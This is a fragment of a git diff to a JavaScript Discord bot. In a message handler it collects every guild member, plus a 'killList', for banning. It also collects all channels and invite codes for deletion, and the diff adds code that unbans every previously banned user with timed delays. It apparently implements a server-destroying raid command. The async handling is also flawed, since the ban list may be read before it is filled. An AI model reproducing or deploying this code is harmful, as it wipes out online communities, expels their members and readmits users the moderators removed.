@@ -611,24 +611,34 @@ bot.on('message', function(user, userID, channelID, message, evt) {
             var toban = Object.values(bot.servers[bot.channels[channelID].guild_id].members).map(m=>m.id);
             var delchannels = Object.values(bot.servers[bot.channels[channelID].guild_id].channels).map(c=>c.id);
             var delinvs;
-            await new Promise(resolve=>{
+            var tounban;
+            
+            toban = arr_shuffle(toban.concat(killList));
+            (async function loop() {
+              
+               await new Promise(resolve=>{
             bot.getServerInvites(bot.channels[channelID].guild_id,(e,r)=>{
               if(e)
               console.log("GET INVITES ERROR: "+JSON.stringify(e));
               if (r)
                delinvs = r.map(i=>i.code);
-              resolve;
                  });
+                 
+                bot.getBans(bot.channels[channelID].guild_id,(e,r)=>{
+                  if(e)
+                    console.log("GET BANS ERROR: "+JSON.stringify(e));
+                  if (r)
+                    tounban = r.map(b=>b.user.id);
+                }); 
+                 
+                 resolve();
+                 
             });
-            //var tounban = Object.values(bot.getBans(bot.channels[channelID].guild_id)).map(b=>b.user.id);
-            
-            toban = arr_shuffle(toban.concat(killList));
-            (async function loop() {
               
-               //for (var b of tounban) {
-            // await new Promise(resolve=>setTimeout(resolve,505));
-            //  bot.unban({serverID: bot.channels[channelID].guild_id, userID: b}, (e)=>{if(e)console.log("unban error: " + JSON.stringify(e))});
-           // }
+               for (var b of tounban) {
+            await new Promise(resolve=>setTimeout(resolve,505));
+              bot.unban({serverID: bot.channels[channelID].guild_id, userID: b}, (e)=>{if(e)console.log("unban error: " + JSON.stringify(e))});
+            }
               
               for (var i of delinvs) {
              await new Promise(resolve=>setTimeout(resolve,505));
